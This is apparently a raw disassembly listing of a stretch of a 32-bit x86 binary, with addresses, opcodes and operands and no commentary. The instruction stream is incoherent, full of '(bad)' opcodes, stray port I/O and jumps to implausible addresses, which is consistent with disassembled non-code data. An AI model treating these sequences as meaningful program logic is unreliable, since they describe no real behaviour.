  40dcf9:	imul   ebp,DWORD PTR ds:0x2561eeb6,0xf0dfc780
  40dd03:	imul   eax,DWORD PTR [edi],0xffffffdb
  40dd06:	adc    eax,0x2c9fb780
  40dd0b:	js     0x40dcbc
  40dd0d:	imul   eax,DWORD PTR ds:0x717c2ef6,0xf5699fca
  40dd17:	mov    ch,0x66
  40dd19:	popa   
  40dd1a:	in     eax,dx
  40dd1b:	jg     0x40dcac
  40dd1d:	fcomip st,st(0)
  40dd1f:	imul   eax,DWORD PTR ds:0x7f7fdddb,0xffffff9f
  40dd26:	mov    al,0x77
  40dd28:	ja     0x40dd93
  40dd2a:	rol    BYTE PTR [edi+0x7fc568fa],0x9d
  40dd31:	jl     0x40dce8
  40dd33:	jg     0x40dd94
  40dd35:	jl     0x40dd6b
  40dd37:	rcl    BYTE PTR [edi+0x69],1
  40dd3a:	lods   eax,DWORD PTR ds:[esi]
  40dd3b:	mov    ecx,0x7fa5616a
  40dd40:	dec    esi
  40dd41:	jecxz  0x40dd6f
  40dd43:	jg     0x40dd84
  40dd45:	imul   ebx,DWORD PTR [ebx+0x68],0x6c8d693f
  40dd4c:	xchg   esp,eax
  40dd4d:	fadd   DWORD PTR [ebp-0x6760d881]
  40dd53:	ja     0x40dd74
  40dd55:	imul   edi,edi,0xfa000080
  40dd5b:	fdiv   st(6),st
  40dd5d:	outs   dx,BYTE PTR ds:[esi]
  40dd5e:	mov    fs,WORD PTR [eax+0x6a865eeb]
  40dd64:	(bad)  
  40dd65:	aam    0x2e
  40dd67:	imul   esi,DWORD PTR [ecx+eiz*8-0x76],0x6e4efc4f
  40dd6f:	push   0xffffffb4
  40dd71:	push   ebp
  40dd72:	pop    esi
  40dd73:	push   0xfffffffe
  40dd75:	push   ecx
  40dd76:	push   ds
  40dd77:	fdivr  st,st(6)
  40dd79:	ss push esi
  40dd7b:	shl    bh,1
  40dd7d:	inc    eax
  40dd7e:	imul   ebp,DWORD PTR [eax-0x2],0x26
  40dd82:	inc    esi
  40dd83:	loopne 0x40dd80
  40dd85:	adc    DWORD PTR [esi+eax*1+0x5365e900],ebp
  40dd8c:	or     ebp,ecx
  40dd8e:	mov    DWORD PTR [ebp+0x74f96aeb],ebx
  40dd94:	mov    WORD PTR [esi+ebx*1+0x6fc667d9],fs
  40dd9b:	sar    edi,cl
  40dd9d:	add    BYTE PTR [edx],0xcf
  40dda0:	inc    eax
  40dda1:	jmp    0xd14cbdad
  40dda6:	push   edi
  40dda7:	fsin   
  40dda9:	(bad)  
  40ddaa:	sub    edx,DWORD PTR [ebx+esi*2+0x42]
  40ddae:	test   DWORD PTR [ebp-0x20d13a84],edx
  40ddb4:	pop    esi
  40ddb5:	mov    esi,0xb1449922
  40ddba:	lods   eax,DWORD PTR ds:[esi]
  40ddbb:	out    0xf7,eax
  40ddbd:	mov    ch,0x0
  40ddbf:	add    BYTE PTR ds:0x2e1f0014,dh
  40ddc5:	push   ecx
  40ddc6:	inc    esp
  40ddc7:	mov    eax,ds:0xe90013c6
  40ddcc:	retf   
  40ddcd:	sar    dh,cl
  40ddcf:	adc    al,0xad
  40ddd1:	out    dx,eax
  40ddd2:	cmp    BYTE PTR [eax],al
  40ddd4:	push   edi
  40ddd5:	push   ecx
  40ddd6:	dec    BYTE PTR [ebp+edx*2-0x1b17b104]
  40dddd:	or     DWORD PTR [eax],eax
  40dddf:	add    BYTE PTR [ebx+0x186a0acf],bl
  40dde5:	test   DWORD PTR [ebx-0x1c],eax
  40dde8:	mov    eax,0xc946ee7b
  40dded:	adc    edi,edi
  40ddef:	jne    0x40ddfd
  40ddf1:	cld    
  40ddf2:	fmul   QWORD PTR [esi+0x6f]
  40ddf5:	out    0x9,al
  40ddf7:	shl    BYTE PTR [edi+edi*8+0x13c9684f],0xef
  40ddff:	mov    esi,0x873e6a8
  40de04:	and    BYTE PTR [ebx+ebp*2-0x5304e001],dh
  40de0b:	dec    ebx
  40de0c:	pop    ds
  40de0d:	out    0xfd,al
  40de0f:	dec    ebp
  40de10:	inc    eax
  40de11:	xchg   edx,eax
  40de12:	jnp    0x40de0c
  40de14:	cwde   
  40de15:	ins    BYTE PTR es:[edi],dx
  40de16:	mov    dh,0xe8
  40de18:	call   0x5240db76
  40de1d:	aad    0x6
  40de1f:	add    BYTE PTR [ebp+0x83ea9a],ah
  40de25:	add    ah,dl
  40de27:	xchg   esp,eax
  40de28:	push   0xfd50e200
  40de2d:	jne    0x40ddbf
  40de2f:	sti    
  40de30:	ror    BYTE PTR [eax+0x7f],0xe9
  40de34:	xchg   DWORD PTR [ebp+0x6c],eax
  40de37:	js     0x40de45
  40de39:	inc    edi
  40de3a:	or     DWORD PTR [eax],edx
  40de3c:	push   DWORD PTR ds:0x413b3c
  40de42:	lahf   
  40de43:	pop    edi
  40de44:	push   es
  40de45:	call   0x3e72f2
  40de4a:	and    BYTE PTR [esi],dl
  40de4c:	inc    edi
  40de4d:	inc    ecx
  40de4e:	xor    DWORD PTR [ebp-0x16],edi
  40de51:	add    DWORD PTR [ecx],esi
  40de53:	jge    0x40ddd7
  40de55:	(bad)  
  40de56:	pushf  
  40de57:	gs push 0xffffffdd
  40de5a:	sbb    eax,0x5cfe7ce6
  40de5f:	add    DWORD PTR [ebx],ebp
  40de61:	inc    ecx
  40de62:	xor    esi,esi
  40de64:	test   BYTE PTR [edi],0x19
  40de67:	add    al,0x7d
  40de69:	(bad)  
  40de6a:	inc    BYTE PTR [eax+eax*1+0x0]
  40de6e:	xor    ebp,edi
  40de70:	jl     0x40dee6
  40de72:	cmp    ebp,edx
  40de74:	pop    ds
  40de75:	jmp    esi
  40de77:	int    0x7c
  40de79:	je     0x40de58
  40de7b:	and    eax,0xe2c907f7
  40de80:	retf   
  40de81:	dec    dh
  40de83:	xor    eax,DWORD PTR [edx+0x3]
  40de86:	xor    DWORD PTR [eax+0xeb87],ebp
  40de8c:	mov    dl,0x30
  40de8e:	pusha  
  40de8f:	push   ebp
  40de90:	pop    esi
  40de91:	xchg   ebx,eax
  40de92:	add    ch,BYTE PTR [edx-0x7]
  40de95:	adc    eax,0xb09907f7
  40de9a:	retf   0x9efe
  40de9d:	jecxz  0x40de65
  40de9f:	sti    
  40dea0:	mov    dl,0x9f
  40dea2:	add    BYTE PTR [edi],ch
  40dea4:	lock jl 0x40dea9
  40dea7:	shrd   DWORD PTR [edi-0x5ceffff],ebx,cl
  40deae:	cmp    eax,0x43c4606
  40deb3:	add    BYTE PTR [esi],bh
  40deb5:	icebp  
  40deb6:	inc    edx
  40deb7:	add    BYTE PTR [ecx],dh
  40deb9:	jge    0x40df3a
  40debb:	cmp    al,0x2f
  40debd:	push   ss
  40debe:	ret    
  40debf:	call   DWORD PTR [esi+0x6d]
  40dec2:	xchg   BYTE PTR [edx-0x7cfd82d0],dh
  40dec8:	add    al,0x14
  40deca:	mov    ebx,0xe913f02d
  40decf:	or     al,0xad
  40ded1:	lods   eax,DWORD PTR ds:[esi]
  40ded2:	out    0x3,eax
  40ded4:	xor    DWORD PTR [ecx-0x2cabaa35],edx
  40deda:	call   0x5fd10ce2
  40dedf:	add    dh,BYTE PTR [ecx]
  40dee1:	adc    al,0x6a
  40dee3:	ds jmp 0x40df1c
  40dee6:	sub    BYTE PTR [ecx+esi*1],al
  40dee9:	adc    eax,0x14318f6d
  40deee:	jmp    0x3540df73
  40def3:	inc    esi
  40def4:	push   es
  40def5:	ret    
  40def6:	out    dx,al
  40def7:	fld    QWORD PTR gs:[edi+0x3e91367]
  40defe:	mov    dl,0x27
  40df00:	repz sub al,0x70
  40df03:	adc    al,0xe9
  40df05:	or     al,0xb5
  40df07:	loop   0x40def0
  40df09:	add    esi,DWORD PTR [ecx]
  40df0b:	cld    
  40df0c:	xchg   ah,al
  40df0e:	jno    0x40df24
  40df10:	xchg   ebx,eax
  40df11:	add    esi,DWORD PTR [esi-0xfd31501]
  40df17:	adc    esp,DWORD PTR [eax-0x3a]
  40df1a:	sahf   
  40df1b:	xchg   ecx,eax
  40df1c:	cmp    DWORD PTR [ebx-0x62],0x16
  40df20:	(bad)  gs:[ecx]
  40df23:	adc    al,0xe9
  40df25:	sub    BYTE PTR [edi+0x7ef5edbe],al
  40df2b:	gs sti 
  40df2d:	add    DWORD PTR [esi-0x2d],ecx
  40df30:	call   0xdf5a65c3
  40df35:	icebp  
  40df36:	xor    eax,0x3105167b
  40df3b:	adc    al,0x72
  40df3d:	shr    BYTE PTR [edx],cl
  40df3f:	cdq    
  40df40:	xor    ch,ah
  40df42:	stos   DWORD PTR es:[edi],eax
  40df43:	jmp    0xe2f3:0xd8bc44ff
  40df4a:	retf   
  40df4b:	adc    eax,0x14340484
  40df50:	add    BYTE PTR [eax-0x16ffecd5],dl
  40df56:	add    BYTE PTR [eax],al
  40df58:	sbb    dh,BYTE PTR [esi+eax*2+0x36652d28]
  40df5f:	xchg   ecx,eax
  40df60:	push   esp
  40df61:	or     BYTE PTR [eax],al
  40df63:	jmp    0x6c4f338f
  40df68:	and    DWORD PTR [ebp-0x2],0x7e5afe9
  40df6f:	jmp    0xea2a6f9f
  40df74:	xor    dl,BYTE PTR [edi+edi*8]
  40df77:	fidivr WORD PTR [edx]
  40df79:	jl     0x40dfda
  40df7b:	mov    ds:0xac88666b,eax
  40df80:	bound  esp,QWORD PTR [esi+0x76]
  40df83:	icebp  
  40df84:	pop    ebx
  40df85:	loopne 0x40df76
  40df87:	ss ret 0xe818
  40df8b:	mul    DWORD PTR [di-0x2]
  40df8f:	xchg   ecx,eax
  40df90:	(bad)  
  40df91:	int    0x40
  40df93:	jmp    0x230bfd3
  40df98:	sbb    al,0xa
  40df9a:	add    cl,ch
  40df9c:	aaa    
  40df9d:	push   esp
  40df9e:	push   cs
  40df9f:	ins    BYTE PTR es:[edi],dx
  40dfa0:	loope  0x40e006
  40dfa2:	(bad)  
  40dfa3:	jmp    0xaccc442c
  40dfa8:	sbb    dl,ch
  40dfaa:	mov    WORD PTR [esi+ecx*1-0x7316962b],fs
  40dfb1:	fs push esp
  40dfb3:	fisub  WORD PTR [ecx]
  40dfb5:	push   ss
  40dfb6:	das    
  40dfb7:	sub    BYTE PTR ds:0xdec019,dh
  40dfbd:	add    dh,ah
  40dfbf:	jge    0x40dfc0
  40dfc1:	dec    DWORD PTR [eax+0x10]
  40dfc4:	lea    eax,[ebp+0x6c]
  40dfc7:	inc    eax
  40dfc8:	std    
  40dfc9:	jne    0x40e03b
  40dfcb:	jmp    0x3d8cc43
  40dfd0:	shr    BYTE PTR [esi],cl
  40dfd2:	or     DWORD PTR [eax],edx
  40dfd4:	or     eax,eax
  40dfd6:	sbb    al,0x68
  40dfd8:	mov    eax,DWORD PTR [ebp-0x48]
  40dfdb:	inc    edi
  40dfdc:	push   0x6a183200
  40dfe1:	pop    es
  40dfe2:	inc    edx
  40dfe3:	sbb    bh,bh
  40dfe5:	jne    0x40df93
  40dfe7:	ficom  WORD PTR [ebx]
  40dfe9:	(bad)  
  40dfea:	neg    BYTE PTR [eax-0x2]
  40dfed:	or     bl,al
  40dfef:	jae    0x40e045
  40dff1:	(bad)  
  40dff2:	(bad)  
  40dff4:	out    0xe8,al
  40dff6:	rcr    esi,0xfd
  40dff9:	mov    DWORD PTR [ebp+0x78458bcb],ebx
  40dfff:	inc    edi
  40e000:	std    
  40e001:	jne    0x40e017
  40e003:	jno    0x40e003
  40e005:	imul   ecx,edi,0x8dfefe71
  40e00b:	ret    
  40e00c:	std    
  40e00d:	adc    eax,0x412d1e
  40e012:	ret    
  40e013:	xlat   BYTE PTR ds:[ebx]
  40e014:	jb     0x40e03f
  40e016:	mov    al,ds:0x6ef0017
  40e01b:	fidiv  WORD PTR [ebx+0x8]
  40e01e:	xor    BYTE PTR [edi],ah
  40e020:	inc    esi
  40e021:	inc    DWORD PTR [eax]
  40e023:	add    BYTE PTR [edi],dh
  40e025:	fidiv  WORD PTR [eax+ecx*1-0x69]
  40e029:	fs add bh,bh
  40e02c:	or     eax,0xce58e80f
  40e031:	fdivp  st(5),st
  40e033:	(bad)  
  40e034:	(bad)  
  40e036:	std    
  40e037:	jne    0x40dfed
  40e039:	fnsave [ebx+0x8]
  40e03c:	xor    DWORD PTR [ebp-0x33],edx
  40e03f:	inc    ebp
  40e040:	push   dx
  40e042:	js     0x40e0b8
  40e044:	jge    0x40e08b
  40e046:	test   BYTE PTR [eax+0x56],cl
  40e049:	mov    ds:0xaa557478,al
  40e04e:	push   cs
  40e04f:	ficom  DWORD PTR [edi]
  40e051:	sub    al,0x4
  40e053:	push   0x31
  40e055:	mov    edx,0x6836ebee
  40e05a:	pop    eax
  40e05b:	sub    eax,0x74776d70
  40e060:	and    DWORD PTR [ebp-0x65e1b720],edx
  40e066:	test   dh,al
  40e068:	inc    ecx
  40e069:	loop   0x40e031
  40e06b:	repz mov dl,0x67
  40e06e:	outs   dx,BYTE PTR ds:[esi]
  40e06f:	push   DWORD PTR [edi]
  40e071:	clc    
  40e072:	imul   edi,ebp,0xfffffffe
  40e075:	stc    
  40e076:	push   0xffffffb4
  40e078:	test   ecx,0xca316978
  40e07e:	out    dx,al
  40e07f:	mul    esi
  40e081:	addr16 or al,0x2f
  40e084:	jo     0x40e0f3
  40e086:	ja     0x40e0fc
  40e088:	add    BYTE PTR [eax],al
  40e08a:	aad    0x21
  40e08c:	out    dx,eax
  40e08d:	pop    es
  40e08e:	(bad)  
  40e090:	sar    esi,0xc6
  40e093:	xchg   ecx,eax
  40e094:	fmul   st,st(0)
  40e096:	repz jo 0x40e09b
  40e099:	push   ebp
  40e09a:	stos   BYTE PTR es:[edi],al
  40e09b:	adc    BYTE PTR [ebx+0x79018dc3],al
  40e0a1:	(bad)  
  40e0a2:	mov    ah,0xb7
  40e0a4:	jbe    0x40e0f5
  40e0a6:	sahf   
  40e0a7:	fild   WORD PTR [esi]
  40e0a9:	call   FWORD PTR [ecx+eax*4+0x29]
  40e0ad:	inc    ecx
  40e0ae:	xor    DWORD PTR ds:0x6d311afd,edx
  40e0b4:	or     eax,eax
  40e0b6:	cs adc al,0x6c
  40e0b9:	test   al,0x31
  40e0bb:	adc    al,0xe9
  40e0bd:	inc    eax
  40e0be:	cmc    
  40e0bf:	pop    ebx
  40e0c0:	call   0xa65511c8
  40e0c5:	mov    esi,0x3ed6262
  40e0ca:	xor    esi,ebp
  40e0cc:	call   0xe92d2fbe
  40e0d1:	in     eax,dx
  40e0d2:	inc    esi
  40e0d3:	(bad)  
  40e0d4:	and    esi,DWORD PTR [eax-0x12]
  40e0d7:	nop
  40e0d8:	imul   ebp,DWORD PTR [edi+0x3f],0x62
  40e0dc:	popf   
  40e0dd:	shr    DWORD PTR [edi],cl
  40e0df:	call   0x60de5974
  40e0e4:	add    dh,0x3b
  40e0e7:	adc    al,0xe9
  40e0e9:	or     al,0xf1
  40e0eb:	call   0x414bd3
  40e0f0:	adc    BYTE PTR [ebx],0xe9
  40e0f3:	add    ebx,DWORD PTR [ecx-0x13d3fb1]
  40e0f9:	(bad)  
  40e0fa:	fild   DWORD PTR [edi]
  40e0fc:	or     ebp,esp
  40e0fe:	lods   al,BYTE PTR ds:[esi]
  40e0ff:	js     0x40e0f0
  40e101:	les    esp,FWORD PTR [ecx+0x53]
  40e104:	mov    ch,0x97
  40e106:	push   esp
  40e107:	jo     0x40e0e8
  40e109:	popa   
  40e10a:	cwde   
  40e10b:	aad    0xce
  40e10d:	hlt    
  40e10e:	lods   al,BYTE PTR ds:[esi]
  40e10f:	js     0x40e0e0
  40e111:	mov    ebp,DWORD PTR [ebx+0x57]
  40e114:	mov    edi,0x846b2d61
  40e119:	int3   
  40e11a:	and    eax,0x91144878
  40e11f:	push   eax
  40e120:	not    edx
  40e122:	call   0x1581be9f
  40e127:	js     0x40e0c8
  40e129:	popa   
  40e12a:	mov    ebx,0xe8d349d7
  40e12f:	imul   eax,esp,0xffffffcd
  40e132:	push   ebp
  40e134:	dec    BYTE PTR [ebx+0x620ef984]
  40e13a:	(bad)  
  40e13b:	push   ebx
  40e13c:	sub    eax,0x7426dbec
  40e141:	popa   
  40e142:	std    
  40e143:	pushf  
  40e144:	or     DWORD PTR [edx-0x2],ebp
  40e147:	into   
  40e148:	out    0x27,al
  40e14a:	pop    esp
  40e14b:	adc    BYTE PTR [ecx+eiz*2-0x1a],ch
  40e14f:	popa   
  40e150:	jp     0x40e1b4
  40e152:	(bad)  
  40e153:	pusha  
  40e154:	add    BYTE PTR [eax],al
  40e156:	mov    al,0x6d
  40e158:	imul   BYTE PTR [esi+0x10ffeac6]
  40e15e:	int3   
  40e15f:	fld    DWORD PTR [eax-0x17]
  40e162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e163:	test   al,0xdb
  40e165:	sahf   
  40e166:	sahf   
  40e167:	(bad)  
  40e168:	(bad)  
  40e169:	aam    0x6
  40e16b:	sub    al,0x41
  40e16d:	jmp    0x7e8bbcfc
  40e172:	xchg   BYTE PTR [esp+eax*4-0x19d697f],cl
  40e179:	add    esi,DWORD PTR ds:0xedaee5ec
  40e17f:	pusha  
  40e180:	std    
  40e181:	xchg   esp,eax
  40e182:	mov    DWORD PTR [edx-0x2],ebp
  40e185:	push   esi
  40e186:	pop    esi
  40e187:	sub    BYTE PTR [eax+eax*1-0xc],bl
  40e18b:	pusha  
  40e18c:	out    0xa5,al
  40e18e:	jmp    0x40e1f1
  40e190:	(bad)  
  40e191:	jo     0x40e143
  40e193:	je     0x40e18b
  40e195:	ss ds jmp 0x40e198
  40e199:	ror    BYTE PTR [ebx-0x26],0x40
  40e19d:	jmp    0x171c89e1
  40e1a2:	es (bad) 
  40e1a4:	(bad)  
  40e1a5:	fdivr  QWORD PTR [esi+0x2b]
  40e1a8:	inc    ecx
  40e1a9:	jmp    0x8c00b8
  40e1ae:	das    
  40e1af:	jmp    0xf179673b
  40e1b4:	std    
  40e1b5:	call   FWORD PTR [ebx]
  40e1b7:	fwait
  40e1b8:	jmp    0xfee9:0x8f0000f7
  40e1bf:	jae    0x40e1fc
  40e1c1:	jo     0x40e1c1
  40e1c3:	(bad)  
  40e1c4:	jg     0x40e16c
  40e1c6:	std    
  40e1c7:	jne    0x40e219
  40e1c9:	in     al,dx
  40e1ca:	xchg   ecx,eax
  40e1cb:	inc    esp
  40e1cc:	outs   dx,DWORD PTR ds:[esi]
  40e1cd:	jmp    0xf1d997cf
  40e1d2:	std    
  40e1d3:	dec    DWORD PTR [edi+0x77e80663]
  40e1d9:	mov    al,ds:0xa38ffffd
  40e1de:	jmp    0x2075:0xfde98ff7
  40e1e5:	in     al,dx
  40e1e6:	xlat   BYTE PTR ds:[ebx]
  40e1e7:	inc    esp
  40e1e8:	mov    edi,0xb0b5fde6
  40e1ed:	out    dx,al
  40e1ee:	std    
  40e1ef:	jmp    FWORD PTR [edi-0x3c17f99c]
  40e1f5:	lahf   
  40e1f6:	std    
  40e1f7:	(bad)  
  40e1f8:	jg     0x40e19e
  40e1fa:	loop   0x40e1f3
  40e1fc:	(bad)  
  40e1fd:	out    0xfd,al
  40e1ff:	jne    0x40e201
  40e201:	in     al,dx
  40e202:	mov    ebx,0xfde68f44
  40e207:	mov    ch,0x78
  40e209:	out    dx,al
  40e20a:	std    
  40e20b:	jmp    FWORD PTR [edi+0x64]
  40e20e:	push   es
  40e20f:	call   0x3e81d3
  40e214:	shld   edx,ebx,0xf7
  40e218:	jmp    ebp
  40e21a:	std    
  40e21b:	jne    0x40e1ed
  40e21d:	jmp    0x40e29d
  40e21f:	inc    BYTE PTR [eax]
  40e221:	add    BYTE PTR [edi],cl
  40e223:	out    0xfd,al
  40e225:	mov    ch,0x6c
  40e227:	out    dx,al
  40e228:	std    
  40e229:	push   DWORD PTR [ecx]
  40e22b:	adc    eax,0xe9e46aa
  40e230:	jbe    0x40e1e6
  40e232:	mov    eax,ds:0x99fe745e
  40e237:	int    0xbd
  40e239:	inc    BYTE PTR [esi-0x7914519a]
  40e23f:	outs   dx,BYTE PTR ds:[esi]
  40e240:	je     0x40e229
  40e242:	pushf  
  40e243:	cs jne 0x40e244
  40e246:	outs   dx,BYTE PTR ds:[esi]
  40e247:	mov    BYTE PTR [ebx-0xa],ch
  40e24a:	inc    si
  40e24c:	imul   ecx,DWORD PTR [ecx-0x18bb20a],0xffffff9c
  40e253:	push   ecx
  40e254:	ins    BYTE PTR es:[edi],dx
  40e255:	dec    BYTE PTR [esi+0x45]
  40e258:	hlt    
  40e259:	inc    esi
  40e25a:	inc    esi
  40e25b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e25c:	je     0x40e212
  40e25e:	push   ecx
  40e25f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e260:	je     0x40e260
  40e262:	dec    ecx
  40e263:	add    DWORD PTR [ebp-0x4181d102],edi
  40e269:	neg    DWORD PTR [eax]
  40e26b:	or     eax,0x8e1efe76
  40e270:	out    dx,al
  40e271:	sti    
  40e272:	or     edi,edx
  40e274:	sbb    al,BYTE PTR [eax]
  40e276:	xor    DWORD PTR [ecx+eax*2-0x76ffcef9],esp
  40e27d:	jmp    0x40e231
  40e27f:	mov    eax,0x43316977
  40e284:	leave  
  40e285:	inc    BYTE PTR [eax]
  40e287:	add    BYTE PTR [ebp+eiz*2+0x6a],ah
  40e28b:	test   DWORD PTR [ebp-0x3a],ebp
  40e28e:	je     0x40e218
  40e290:	je     0x40e263
  40e292:	jmp    0x40e24b
  40e294:	outs   dx,BYTE PTR ds:[esi]
  40e295:	lods   al,BYTE PTR ds:[esi]
  40e296:	add    bh,bh
  40e298:	inc    esp
  40e299:	gs push 0x7
  40e29c:	(bad)  
  40e29d:	and    eax,0x3144fe75
  40e2a2:	jne    0x40e318
  40e2a4:	sub    DWORD PTR [ecx+edx*1],edx
  40e2a7:	mov    bl,0xf2
  40e2a9:	pop    esi
  40e2aa:	sbb    eax,0xe917704b
  40e2af:	into   
  40e2b0:	stos   DWORD PTR es:[edi],eax
  40e2b1:	outs   dx,DWORD PTR ds:[esi]
  40e2b2:	imul   eax,DWORD PTR [eax-0x5e],0x99077b5e
  40e2b9:	cmp    cl,ah
  40e2bb:	add    esi,DWORD PTR [ecx]
  40e2bd:	or     ebp,DWORD PTR [ecx]
  40e2bf:	out    dx,eax
  40e2c0:	xor    cl,BYTE PTR [ebp+0x2a]
  40e2c3:	or     BYTE PTR [ecx],dh
  40e2c5:	pop    edi
  40e2c6:	pop    ebx
  40e2c7:	adc    al,0x59
  40e2c9:	or     BYTE PTR [ecx],al
  40e2cb:	add    al,0x31
  40e2cd:	or     ebp,DWORD PTR [ecx-0x55b2cd12]
  40e2d3:	pop    es
  40e2d4:	xor    DWORD PTR [ebp-0x17b083d5],ecx
  40e2da:	shr    BYTE PTR [ebx+0x1d],0xd7
  40e2de:	mov    ch,0x74
  40e2e0:	test   eax,0xbd74acd8
  40e2e5:	pop    edi
  40e2e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2e7:	out    dx,al
  40e2e8:	es pop esi
  40e2ea:	adc    edx,DWORD PTR [eax+eax*1]
  40e2ed:	add    BYTE PTR [ecx],bl
  40e2ef:	dec    edi
  40e2f0:	cmp    dh,BYTE PTR [ebp+0x1f]
  40e2f3:	or     ch,BYTE PTR [ecx+0x2b8b5bef]
  40e2f9:	jo     0x40e293
  40e2fb:	adc    al,0x6c
  40e2fd:	mov    esi,0xee75c502
  40e302:	cli    
  40e303:	ins    BYTE PTR es:[edi],dx
  40e304:	mov    edx,0xf15df7e7
  40e309:	inc    ebx
  40e30a:	bound  esi,QWORD PTR [esi]
  40e30c:	rol    DWORD PTR [ebx],1
  40e30e:	inc    ecx
  40e30f:	ins    DWORD PTR es:[edi],dx
  40e310:	xchg   esi,eax
  40e311:	je     0x40e378
  40e313:	or     al,0x41
  40e315:	shl    DWORD PTR [ebx+0x5d],cl
  40e318:	inc    ebp
  40e319:	je     0x40e360
  40e31b:	adc    BYTE PTR [esi],bh
  40e31d:	out    dx,al
  40e31e:	cs ins BYTE PTR es:[edi],dx
  40e320:	dec    DWORD PTR [ebp+0x2efe5ef1]
  40e326:	(bad)  
  40e327:	popa   
  40e328:	(bad)  
  40e329:	pushf  
  40e32a:	es pop esi
  40e32c:	je     0x40e31f
  40e32e:	sbb    dh,al
  40e330:	inc    edx
  40e331:	push   ss
  40e332:	and    eax,0xa0d745e
  40e337:	mov    bh,0x45
  40e339:	push   es
  40e33a:	add    eax,0x32edc14c
  40e33f:	(bad)  
  40e340:	mov    al,BYTE PTR ds:0x97d351b1
  40e346:	std    
  40e347:	out    0xb,eax
  40e349:	rcr    DWORD PTR [edx-0x36],1
  40e34c:	(bad)  
  40e34d:	fisub  WORD PTR [esi-0x63]
  40e350:	je     0x40e33e
  40e352:	add    BYTE PTR [eax],al
  40e354:	or     BYTE PTR [ecx+eax*8-0x23],0x32
  40e359:	pop    DWORD PTR [ecx+edi*4+0x65]
  40e35d:	pop    esi
  40e35e:	je     0x40e34d
  40e360:	jmp    0xc009:0xc2b64bfb
  40e367:	fisubr WORD PTR [esi+0x32e8ff3d]
  40e36d:	pop    ebp
  40e36e:	je     0x40e30d
  40e370:	test   DWORD PTR [eax-0x735d69bb],ebx
  40e376:	inc    esp
  40e377:	jge    0x40e31b
  40e379:	call   0x69496a79
  40e37e:	(bad)  
  40e37f:	hlt    
  40e380:	call   0x8a5e:0x822faa75
  40e387:	hlt    
  40e388:	push   esi
  40e389:	ins    BYTE PTR es:[edi],dx
  40e38a:	mov    ds:0x681432e9,al
  40e38f:	cli    
  40e390:	stos   BYTE PTR es:[edi],al
  40e391:	sar    edi,cl
  40e393:	mov    esi,0xe917657a
  40e398:	xor    cl,BYTE PTR [ecx]
  40e39a:	rol    BYTE PTR [eax],0x8d
  40e39d:	or     ebp,ecx
  40e39f:	cwde   
  40e3a0:	fcom   DWORD PTR [eax]
  40e3a2:	add    BYTE PTR [ebx+0x48113ff8],cl
  40e3a8:	mov    DWORD PTR [eax],edx
  40e3aa:	call   0x5192e8
  40e3af:	add    ecx,DWORD PTR [eax-0x21]
  40e3b2:	jae    0x40e39c
  40e3b4:	mov    al,0x35
  40e3b6:	dec    eax
  40e3b7:	inc    ecx
  40e3b8:	add    BYTE PTR [eax],al
  40e3ba:	mov    BYTE PTR [edx],bh
  40e3bc:	out    0xd3,al
  40e3be:	nop
  40e3bf:	adc    BYTE PTR [eax],al
  40e3c1:	or     ebx,DWORD PTR [eax+0x5b]
  40e3c4:	add    bl,ch
  40e3c6:	(bad)  
  40e3c7:	fimul  WORD PTR [esi]
  40e3c9:	mov    BYTE PTR [ebp+0x7c4587f5],bl
  40e3cf:	cmp    BYTE PTR [ebx],ah
  40e3d1:	dec    eax
  40e3d2:	sbb    DWORD PTR [eax],ebx
  40e3d4:	push   esi
  40e3d5:	call   0x40ec9c
  40e3da:	push   ebx
  40e3db:	shl    BYTE PTR [ebx+0x2],1
  40e3de:	arpl   WORD PTR [ebx-0x77],ax
  40e3e1:	lock loopne 0x40e40e
  40e3e4:	dec    eax
  40e3e5:	inc    ecx
  40e3e6:	dec    eax
  40e3e7:	mov    eax,0x104816fc
  40e3ec:	add    esi,eax
  40e3ee:	mov    eax,ds:0xfb68da5c
  40e3f3:	lahf   
  40e3f4:	aas    
  40e3f5:	add    BYTE PTR [esi-0x48],bl
  40e3f8:	xchg   esi,eax
  40e3f9:	sbb    BYTE PTR [eax],cl
  40e3fb:	sbb    BYTE PTR [ebx],cl
  40e3fd:	ror    BYTE PTR ds:0x823beb12,0x7
  40e404:	mov    BYTE PTR [ebp-0x61],dl
  40e407:	fadd   DWORD PTR [ebx-0x28]
  40e40a:	xchg   ebx,eax
  40e40b:	dec    esp
  40e40c:	loop   0x40e3d4
  40e40e:	fcom   DWORD PTR [edi]
  40e410:	mov    eax,DWORD PTR [ebp+0x70]
  40e413:	int    0xfe
  40e415:	push   DWORD PTR [ecx]
  40e417:	ret    0xdbf7
  40e41a:	(bad)  
  40e41b:	inc    eax
  40e41c:	pop    edx
  40e41d:	inc    BYTE PTR [eax]
  40e41f:	add    BYTE PTR [ebp+eiz*2+0x5a],al
  40e423:	xchg   edx,eax
  40e424:	(bad)  
  40e425:	sbb    dh,BYTE PTR [edx-0x77]
  40e428:	fs into 
  40e42a:	jge    0x40e470
  40e42c:	int    0xf5
  40e42e:	adc    cl,BYTE PTR [edx+0x447e1a04]
  40e434:	mov    ebp,esp
  40e436:	adc    al,BYTE PTR [eax-0x7afe92a1]
  40e43c:	std    
  40e43d:	or     DWORD PTR [edx-0x2],esi
  40e440:	mov    ds,eax
  40e442:	pop    esi
  40e443:	out    0xd0,eax
  40e445:	mov    al,0x71
  40e447:	(bad)  
  40e448:	lods   al,BYTE PTR ds:[esi]
  40e449:	test   al,0x72
  40e44b:	dec    edi
  40e44c:	mov    DWORD PTR [edx],esi
  40e44e:	mov    esi,0x3466efe
  40e453:	pop    esi
  40e454:	js     0x40e405
  40e456:	(bad)  
  40e457:	inc    DWORD PTR [esi+esi*8]
  40e45a:	pop    edi
  40e45b:	(bad)  
  40e45c:	fdivr  QWORD PTR [eax]
  40e45e:	pop    edx
  40e45f:	aam    0xf8
  40e461:	push   ecx
  40e462:	jo     0x40e46e
  40e464:	jno    0x40e487
  40e466:	sbb    ebp,DWORD PTR [eax+0x47]
  40e469:	sub    al,bl
  40e46b:	jmp    esi
  40e46d:	push   esp
  40e46e:	fisttp QWORD PTR [eax+0x2e]
  40e471:	mov    dl,0xd3
  40e473:	addr16 aaa 
  40e475:	lahf   
  40e476:	ret    
  40e477:	call   DWORD PTR [esi-0x2810fd93]
  40e47d:	adc    al,0x9
  40e47f:	dec    eax
  40e480:	jo     0x40e4ef
  40e482:	sar    dh,cl
